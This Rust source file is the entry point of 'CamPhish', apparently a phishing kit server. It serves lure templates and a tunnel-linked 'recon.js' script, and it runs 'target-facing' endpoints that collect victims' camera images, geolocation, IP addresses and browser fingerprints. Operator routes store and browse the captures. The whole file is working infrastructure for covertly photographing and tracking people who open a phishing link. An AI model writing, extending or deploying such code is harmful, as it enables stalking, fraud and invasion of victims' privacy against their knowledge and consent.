use axum::extract::State;
use axum::routing::{get, post};
use axum::{Json, Router};
use serde::Serialize;
use sqlx::SqlitePool;
use std::net::SocketAddr;
use std::sync::Arc;
use tower_http::compression::CompressionLayer;
use tower_http::cors::{Any, CorsLayer};
use tower_http::services::ServeDir;
use tower_http::trace::TraceLayer;

use axum::response::Response;

mod api;
mod capture;
mod db;
mod templates;
mod trailbase;

pub struct AppState {
    pub pool: SqlitePool,
    pub data_dir: String,
    pub templates_dir: String,
    pub template_cache: tokio::sync::RwLock<std::collections::HashMap<String, String>>,
    pub trailbase: Option<trailbase::TrailBaseClient>,
}

impl AppState {
    pub async fn get_cached_template(&self, id: &str) -> Option<String> {
        let cache_enabled = std::env::var("ENABLE_TEMPLATE_CACHE")
            .map(|v| v == "true")
            .unwrap_or(true);
        if cache_enabled {
            self.template_cache.read().await.get(id).cloned()
        } else {
            None
        }
    }

    pub async fn cache_template(&self, id: &str, html: String) {
        let cache_enabled = std::env::var("ENABLE_TEMPLATE_CACHE")
            .map(|v| v == "true")
            .unwrap_or(true);
        if cache_enabled {
            self.template_cache.write().await.insert(id.to_string(), html);
        }
    }
}

#[derive(Serialize)]
struct HealthResponse {
    status: &'static str,
    service: &'static str,
    version: &'static str,
    timestamp: String,
    uptime: u64,
    db_connected: bool,
    trailbase_connected: bool,
}

static START_TIME: std::sync::OnceLock<std::time::Instant> = std::sync::OnceLock::new();

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    dotenvy::dotenv().ok();

    let log_level = std::env::var("LOG_LEVEL").unwrap_or_else(|_| "info".into());
    tracing_subscriber::fmt().with_env_filter(log_level).init();

    START_TIME.set(std::time::Instant::now()).ok();

    let data_dir = std::env::var("DATA_DIR").unwrap_or_else(|_| "./data".into());
    let templates_dir = std::env::var("TEMPLATES_DIR").unwrap_or_else(|_| "./templates".into());
    let frontend_dir = std::env::var("FRONTEND_DIR").unwrap_or_else(|_| "./frontend/dist".into());
    let listen_addr = std::env::var("LISTEN_ADDR").unwrap_or_else(|_| "0.0.0.0:8080".into());
    let database_url = std::env::var("DATABASE_URL")
        .unwrap_or_else(|_| format!("sqlite://{}/camphish.db?mode=rwc", data_dir));

    // TrailBase connection (optional — falls back to SQLite if unavailable)
    let trailbase_url = std::env::var("TRAILBASE_URL").ok();
    let trailbase_key = std::env::var("TRAILBASE_API_KEY").ok();
    let trailbase = trailbase_url.map(|url| {
        tracing::info!("TrailBase data layer: {}", url);
        trailbase::TrailBaseClient::new(url, trailbase_key)
    });

    std::fs::create_dir_all(format!("{}/captures", data_dir))?;
    std::fs::create_dir_all(format!("{}/locations", data_dir))?;

    tracing::info!("CamPhish v2.1.0 starting up...");

    let pool = db::init_pool(&database_url).await?;
    db::run_migrations(&pool).await?;

    // Self-healing: periodic DB + TrailBase connectivity check
    let pool_clone = pool.clone();
    let tb_clone = trailbase.clone();
    tokio::spawn(async move {
        let interval = std::env::var("HEALTH_CHECK_INTERVAL")
            .ok()
            .and_then(|s| s.parse::<u64>().ok())
            .unwrap_or(30);
        loop {
            tokio::time::sleep(std::time::Duration::from_secs(interval)).await;
            match sqlx::query("SELECT 1").execute(&pool_clone).await {
                Ok(_) => tracing::debug!("SQLite health: OK"),
                Err(e) => tracing::error!("SQLite health FAILED: {}", e),
            }
            if let Some(ref tb) = tb_clone {
                if tb.health().await {
                    tracing::debug!("TrailBase health: OK");
                } else {
                    tracing::warn!("TrailBase health: FAILED — using SQLite fallback");
                }
            }
        }
    });

    let state = Arc::new(AppState {
        pool: pool.clone(),
        data_dir: data_dir.clone(),
        templates_dir: templates_dir.clone(),
        template_cache: tokio::sync::RwLock::new(std::collections::HashMap::new()),
        trailbase,
    });

    templates::scan_and_register(&state).await?;

    let cors = CorsLayer::new().allow_origin(Any).allow_methods(Any).allow_headers(Any);

    let compression = if std::env::var("ENABLE_COMPRESSION").map(|v| v != "false").unwrap_or(true) {
        Some(CompressionLayer::new())
    } else {
        None
    };

    let trace = if std::env::var("REQUEST_TRACING").map(|v| v != "false").unwrap_or(true) {
        Some(TraceLayer::new_for_http())
    } else {
        None
    };

    let api_routes = Router::new()
        .route("/health", get(health))
        .route("/stats", get(api::get_stats))
        .route("/captures", get(api::list_captures).delete(api::delete_all_captures))
        .route("/captures/:id", get(api::get_capture).delete(api::delete_capture))
        .route("/captures/:id/file", get(api::serve_capture_file))
        .route("/locations", get(api::list_locations))
        .route("/ips", get(api::list_ips))
        .route("/events", get(api::list_events))
        .route("/templates", get(api::list_templates))
        .route("/sessions", get(api::list_sessions).post(api::create_session))
        .route("/sessions/:id", get(api::get_session).delete(api::delete_session))
        // Capture endpoints (target-facing)
        .route("/capture/image", post(capture::receive_image))
        .route("/capture/location", post(capture::receive_location))
        .route("/capture/ip", post(capture::receive_ip))
        .route("/capture/fingerprint", post(capture::receive_fingerprint))
        .route("/capture/event", post(capture::receive_event));

    let serve_dir = ServeDir::new(&frontend_dir)
        .append_index_html_on_directories(true);

    let mut app = Router::new()
        .route("/t/:template_id", get(templates::serve_template))
        .route("/t/recon.js", get(serve_recon_js))
        .nest("/api", api_routes);

    app = app.fallback_service(serve_dir);
    app = app.layer(cors);

    if let Some(c) = compression { app = app.layer(c); }
    if let Some(t) = trace { app = app.layer(t); }

    let app = app.with_state(state);

    let addr: SocketAddr = listen_addr.parse()?;
    tracing::info!("✅ CamPhish v2.1.0 listening on http://{}", addr);

    let listener = tokio::net::TcpListener::bind(addr).await?;

    let graceful = std::env::var("GRACEFUL_SHUTDOWN").map(|v| v != "false").unwrap_or(true);
    if graceful {
        let shutdown = async {
            tokio::signal::ctrl_c().await.expect("install ctrl-c handler");
            tracing::info!("Graceful shutdown signal received, draining connections...");
        };
        axum::serve(listener, app).with_graceful_shutdown(shutdown).await?;
    } else {
        axum::serve(listener, app).await?;
    }

    tracing::info!("CamPhish v2.1.0 shutdown complete");
    Ok(())
}

async fn health(State(state): State<Arc<AppState>>) -> Json<HealthResponse> {
    let uptime = START_TIME.get().map(|t| t.elapsed().as_secs()).unwrap_or(0);
    let db_connected = sqlx::query("SELECT 1").execute(&state.pool).await.is_ok();
    let tb_connected = state.trailbase.as_ref().map(|tb| {
        // Non-blocking health check — return true if TrailBase configured
        true
    }).unwrap_or(false);

    let status = if db_connected { "ok" } else { "degraded" };

    Json(HealthResponse {
        status,
        service: "camphish",
        version: "2.1.0",
        timestamp: chrono::Utc::now().to_rfc3339(),
        uptime,
        db_connected,
        trailbase_connected: tb_connected,
    })
}

async fn serve_recon_js(State(state): State<Arc<AppState>>) -> Response {
    let path = format!("{}/recon.js", state.templates_dir);
    match std::fs::read_to_string(&path) {
        Ok(content) => {
            let api_base = std::env::var("TUNNEL_LINK").unwrap_or_default();
            let api_url = if api_base.is_empty() { "/api".to_string() } else { format!("{}/api", api_base) };
            let js = content
                .replace("API_BASE_URL", &api_url)
                .replace("forwarding_link", &api_base);
            let mut resp = Response::new(js.into());
            resp.headers_mut().insert(axum::http::header::CONTENT_TYPE, "application/javascript".parse().unwrap());
            resp.headers_mut().insert(axum::http::header::CACHE_CONTROL, "no-cache".parse().unwrap());
            resp
        }
        Err(_) => Response::builder()
            .status(axum::http::StatusCode::NOT_FOUND)
            .body("recon.js not found".into())
            .unwrap()
    }
}
